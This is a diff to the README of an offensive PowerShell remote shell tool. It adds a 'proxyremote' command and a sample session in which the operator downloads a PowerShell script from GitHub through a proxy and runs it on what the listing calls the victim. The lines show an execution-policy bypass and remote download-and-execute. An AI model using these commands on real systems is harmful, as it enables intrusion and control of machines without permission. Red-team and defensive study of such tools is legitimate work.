@@ -68,6 +68,7 @@ powershell -exec bypass Import-Module .\PS-RemoteShell.ps1; PS-RemoteShell -ip 1
 Supported commands:
 ------------------------------
 
+        proxyremote     [url path cmd]  Remotely download powershell script and execute a command through the built in proxy
         read    [path]          Show the content of the specified file
         remote  [url cmd]       Remotely download powershell script and execute a command
         upload  [url path]      Download a remote file and save it to the victim disk
@@ -95,6 +96,17 @@ Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
      39       6     2240       5208    46     0.02   4304 AppUIMonitor_00   
  ...
  [*] DownloadExecute: execution Completed
+
+(10.0.0.153:RINGZER0\mrun1k0d3r):Command >proxyremote http://10.0.0.153:1111 https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1 Get-BrowserHomepage
+[*] ProxyDownloadExecute: Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1
+[*] ProxyDownloadExecute: Proxying through http://10.0.0.153:1111
+[*] ProxyDownloadExecute: Executing Get-BrowserHomepage
+
+Start Page
+----------
+https://www.ringzer0team.com/
+
+[*] ProxyDownloadExecute: execution Completed
 ```
 
 # Credit 
